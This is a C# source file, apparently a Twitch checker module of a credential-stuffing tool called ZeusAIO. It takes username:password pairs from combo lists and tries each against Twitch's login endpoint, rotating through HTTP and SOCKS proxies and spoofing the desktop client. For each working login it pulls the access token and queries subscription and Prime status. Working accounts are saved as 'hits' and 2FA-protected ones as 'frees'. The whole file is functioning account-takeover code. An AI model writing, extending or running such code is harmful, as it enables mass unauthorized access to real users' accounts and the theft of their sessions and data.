using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using Leaf.xNet;
using System.Text.RegularExpressions;
using Console = Colorful.Console;
using System.Drawing;
using Valorant;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using ZeusAIO;
using TunnelBear;


namespace Twitch
{
    class Check
    {
        public static bool CheckAccount(string[] s, string proxy)
        {
            for (int i = 0; i < Config.config.Retries + 1; i++)
                while (true)
                    try
                    {
                    Retry:
                        using (HttpRequest httpRequest = new HttpRequest())
                        {
                            proxy = ZeusAIO.mainmenu.proxies.ElementAt(new Random().Next(ZeusAIO.mainmenu.proxiesCount));
                            if (ZeusAIO.mainmenu.proxyProtocol == "HTTP")
                            {
                                httpRequest.Proxy = HttpProxyClient.Parse(proxy);
                            }
                            if (ZeusAIO.mainmenu.proxyProtocol == "SOCKS4")
                            {
                                httpRequest.Proxy = Socks4ProxyClient.Parse(proxy);
                            }
                            if (ZeusAIO.mainmenu.proxyProtocol == "SOCKS5")
                            {
                                httpRequest.Proxy = Socks5ProxyClient.Parse(proxy);
                            }
                            httpRequest.UserAgent = "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) twitch-desktop-electron-platform/1.0.0 Chrome/78.0.3904.130 Electron/7.3.1 Safari/537.36 desklight/8.56.1";
                        httpRequest.IgnoreProtocolErrors = true;
                        httpRequest.AllowAutoRedirect = true;
                        httpRequest.Referer = "https://www.twitch.tv/";
                        httpRequest.AddHeader("Content-Type", "text/plain;charset=UTF-8");
                        string str = "{\"username\":\"" + s[0] + "\",\"password\":\"" + s[1] + "\",\"client_id\":\"jf3xu125ejjjt5cl4osdjci6oz6p93r\",\"undelete_user\":false}";
                        httpRequest.SslCertificateValidatorCallback = (RemoteCertificateValidationCallback)Delegate.Combine(httpRequest.SslCertificateValidatorCallback,
                        new RemoteCertificateValidationCallback((object obj, X509Certificate cert, X509Chain ssl, SslPolicyErrors error) => (cert as X509Certificate2).Verify()));
                        string text2 = httpRequest.Post("https://passport.twitch.tv/login", str, "application/x-www-form-urlencoded").ToString();
                        bool flag7 = text2.Contains("\"access_token\"");

                        if (flag7)
                        {
                            string accessToken = Regex.Match(text2, "{\"access_token\":\"(.*?)\"").Groups[1].Value;

                            string captures = TwitchGetCaptures(accessToken);

                            ZeusAIO.mainmenu.hits++;
                            if (Config.config.LogorCui== "2")
                            {
                                Console.WriteLine("[HIT - TWITCH] " + s[0] + ":" + s[1] + " | " + captures, Color.Green);
                            }
                            Export.AsResult("/Twitch_hits", s[0] + ":" + s[1] + " | " + captures);
                            return false;
                           
                        }
                        else if (text2.Contains("missing authy token\",\"sms_proof\"") || text2.Contains("user needs password reset") || text2.Contains("missing twitchguard code") || text2.Contains("Please enter a Login Verification Code"))
                        {
                                ZeusAIO.mainmenu.frees++;
                                if (Config.config.LogorCui == "2")
                                {
                                    Console.WriteLine("[FREE - TWITCH] " + s[0] + ":" + s[1], Color.OrangeRed);
                                }
                                Export.AsResult("/Twitch_frees", s[0] + ":" + s[1]);
                                return false;
                            }
                        else
                            {
                                ZeusAIO.mainmenu.errors++;
                                goto Retry;
                            }
                    }
                    break;
                }
                catch (Exception ex)
                {
                    ZeusAIO.mainmenu.errors++;
                }
            return false;
        }


        static string TwitchGetCaptures(string accessToken)
        {
            while (true)
                try
                {
                    using (HttpRequest httpRequest = new HttpRequest())
                    {
                        string proxy = ZeusAIO.mainmenu.proxies.ElementAt(new Random().Next(ZeusAIO.mainmenu.proxiesCount));
                        if (ZeusAIO.mainmenu.proxyProtocol == "HTTP")
                        {
                            httpRequest.Proxy = HttpProxyClient.Parse(proxy);
                        }
                        if (ZeusAIO.mainmenu.proxyProtocol == "SOCKS4")
                        {
                            httpRequest.Proxy = Socks4ProxyClient.Parse(proxy);
                        }
                        if (ZeusAIO.mainmenu.proxyProtocol == "SOCKS5")
                        {
                            httpRequest.Proxy = Socks5ProxyClient.Parse(proxy);
                        }
                        httpRequest.UserAgent = "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) twitch-desktop-electron-platform/1.0.0 Chrome/78.0.3904.130 Electron/7.3.1 Safari/537.36 desklight/8.56.1";
                        httpRequest.IgnoreProtocolErrors = true;
                        httpRequest.AllowAutoRedirect = true;

                        httpRequest.Authorization = "OAuth " + accessToken;
                        httpRequest.AddHeader("Client-Id", "jf3xu125ejjjt5cl4osdjci6oz6p93r");
                        httpRequest.Referer = "https://www.twitch.tv/subscriptions";


                        string strResponse = httpRequest.Post(new Uri("https://gql.twitch.tv/gql"), "[{\"operationName\":\"SubscriptionsManagement_SubscriptionBenefits\",\"variables\":{\"limit\":100,\"cursor\":\"\",\"filter\":\"PLATFORM\",\"platform\":\"WEB\"},\"extensions\":{\"persistedQuery\":{\"version\":1,\"sha256Hash\":\"ad8308801011d87d3b4aa3007819a36e1f1e1283d4b61e7253233d6312a00442\"}}},{\"operationName\":\"SubscriptionsManagement_SubscriptionBenefits\",\"variables\":{\"limit\":100,\"cursor\":\"\",\"filter\":\"GIFT\",\"platform\":\"WEB\"},\"extensions\":{\"persistedQuery\":{\"version\":1,\"sha256Hash\":\"ad8308801011d87d3b4aa3007819a36e1f1e1283d4b61e7253233d6312a00442\"}}},{\"operationName\":\"SubscriptionsManagement_SubscriptionBenefits\",\"variables\":{\"limit\":100,\"cursor\":\"\",\"filter\":\"PLATFORM\",\"platform\":\"MOBILE_ALL\"},\"extensions\":{\"persistedQuery\":{\"version\":1,\"sha256Hash\":\"ad8308801011d87d3b4aa3007819a36e1f1e1283d4b61e7253233d6312a00442\"}}},{\"operationName\":\"SubscriptionsManagement_SubscriptionBenefits\",\"variables\":{\"limit\":100,\"cursor\":\"\",\"filter\":\"ALL\",\"platform\":\"WEB\"},\"extensions\":{\"persistedQuery\":{\"version\":1,\"sha256Hash\":\"ad8308801011d87d3b4aa3007819a36e1f1e1283d4b61e7253233d6312a00442\"}}},{\"operationName\":\"SubscriptionsManagement_ExpiredSubscriptions\",\"variables\":{\"limit\":100,\"cursor\":\"\"},\"extensions\":{\"persistedQuery\":{\"version\":1,\"sha256Hash\":\"fa5bcd68980e687a0b4ff2ef63792089df1500546d5f1bb2b6e9ee4a6282222b\"}}}]", "text/plain;charset=UTF-8").ToString();

                        string hasPrime = Regex.Match(strResponse, "hasPrime\":(.*?),").Groups[1].Value;

                        if (hasPrime.Contains("true"))
                            return "Has Twitch Prime";
                        else
                            return "Free";
                    }
                }
                catch
                {
                    ZeusAIO.mainmenu.errors++;
                }
            return "";
        }

    }
}
